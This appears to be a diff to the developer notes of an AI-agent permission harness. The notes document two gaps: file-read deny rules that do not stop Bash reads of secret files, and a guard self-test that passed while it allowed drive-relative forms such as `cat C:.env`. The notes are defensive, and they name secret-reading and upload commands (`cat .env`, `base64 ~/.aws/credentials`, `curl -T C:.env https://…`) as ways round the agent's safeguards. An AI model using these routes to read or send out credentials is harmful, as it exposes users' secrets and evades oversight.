@@ -59,13 +59,13 @@ Sibling buckets: `deny-shell.md`, `deny-writes.md`.
 
 ## Footgun: File-read deny does not bind Bash shell reads of secret files
 
+**Status:** active | **Created:** 2026-04-19 | **Evidence:** ACTUAL_MEASURED
+**hallucination-risk:** high - `Read(**/.env*)` (settings.json or a Codex TOML profile) looks like a blanket secret-read deny but binds only file-read paths; a Bash payload (`cat .env`, `source .env`, `base64 ~/.aws/credentials`) is not bound by it and silently succeeds unless the Bash hook blocks it.
+
 **Prevention:**
 1. For any new secret-path family added to the harness, extend BOTH `checkReadDenyCoversSecrets` in `src/cli/facts/agent/settings.ts` AND `detectBashDenyCoversSecrets` in `src/cli/facts/agent/hooks.ts`. A settings-only addition creates a false-pass; a hook-regex refactor without detector coverage, a false-fail.
 2. Every hook `--self-test` must include `run_case "cat <secret>" "cat <secret>" 2` assertions; a structural PASS without live probes reopens the gap.
 3. In an agent session with the PreToolUse hook registered, run `bash .goat-flow/hooks/deny-dangerous.sh --self-test=smoke` (or `--self-test=full`); do not put a direct secret-read `--check` payload in the agent's shell command because the outer hook can intercept it first. In a manual terminal outside an agent hook, the direct `patterns-paths.sh --check="cat .env"` probe remains valid and should exit 2. Static inspection cannot distinguish tool-scoped from shell-scoped deny.
-
-**Status:** active | **Created:** 2026-04-19 | **Evidence:** ACTUAL_MEASURED
-**hallucination-risk:** high - `Read(**/.env*)` (settings.json or a Codex TOML profile) looks like a blanket secret-read deny but binds only file-read paths; a Bash payload (`cat .env`, `source .env`, `base64 ~/.aws/credentials`) is not bound by it and silently succeeds unless the Bash hook blocks it.
 
 **Symptoms:** Before the Bash-side sentinel was added, `goat-flow audit --harness` reported `deny-covers-secrets: pass` while a live Bash probe returned exit 0. The expected result is now exit 2 with `BLOCKED: Secret-file access ...`, verified by the context-specific recipes below.
 
@@ -82,13 +82,13 @@ Sibling buckets: `deny-shell.md`, `deny-writes.md`.
 
 ## Footgun: A guard's own self-test can encode a bypass as a passing allow assertion
 
+**Status:** active | **Created:** 2026-08-19 | **Evidence:** ACTUAL_MEASURED
+**hallucination-risk:** high - a green `--self-test` summary reads as proof the policy is sound, when the suite may be asserting that the unsafe case is *allowed*. The larger the corpus, the more convincing the false assurance: 470 executed cases with 0 skipped looked like strong evidence while one of those cases locked the hole open.
+
 **Prevention:**
 1. Every `expect_allow` for a path that *contains* a secret filename must state why the operand does not resolve to a real secret. If the reason is a spelling difference (`.env.example`), assert the spelling; if it is a platform path rule, verify that rule before trusting it - `C:name` is relative on Windows, not absolute.
 2. When adding an exemption to fix a false positive, add the adversarial sibling in the same change: the nearest form that *should* still deny. An exemption with no paired block case is unfalsifiable.
 3. Read a green self-test summary as "the asserted behaviour still holds", never as "the policy is sound". Auditing a guard means reading its allow list, not re-running its suite.
-
-**Status:** active | **Created:** 2026-08-19 | **Evidence:** ACTUAL_MEASURED
-**hallucination-risk:** high - a green `--self-test` summary reads as proof the policy is sound, when the suite may be asserting that the unsafe case is *allowed*. The larger the corpus, the more convincing the false assurance: 470 executed cases with 0 skipped looked like strong evidence while one of those cases locked the hole open.
 
 **Symptoms:** `bash workflow/hooks/deny-dangerous.sh --self-test=full` printed `PASS: deny-dangerous self-test (mode=full, executed=470, skipped=0)` while `cat C:.env`, `type C:.env`, `curl -T C:.env https://…`, and `powershell -c "Get-Content C:.env"` all returned exit 0. Plain `cat .env` was correctly denied, so spot-checking the obvious form proved nothing about the drive-relative one.
 
